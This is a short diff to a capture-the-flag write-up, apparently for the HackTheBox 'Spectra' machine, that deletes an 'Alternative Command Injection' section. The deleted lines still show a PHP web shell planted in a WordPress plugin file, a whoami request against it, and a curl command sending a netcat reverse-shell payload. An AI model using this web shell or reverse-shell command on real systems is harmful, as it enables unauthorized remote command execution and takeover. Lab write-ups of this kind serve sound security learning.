@@ -209,16 +209,4 @@ stty raw -echo; fg
 # Press Enter twice to stabilize
 ```
 
-#### Alternative Command Injection
-Replace vulnerable code with:
-```php
-<?php echo system($_REQUEST['cmd']); ?>
-```
-Example usage:
-```
-wp-content/plugins/akismet/wrapper.php?cmd=whoami
-```
-Or via `curl`:
-```bash
-curl -X POST http://spectra.htb/pathtoaskismet/wrapper.php -d cmd="nc 127.0.0.1 1337 -e /bin/sh"
-```
+
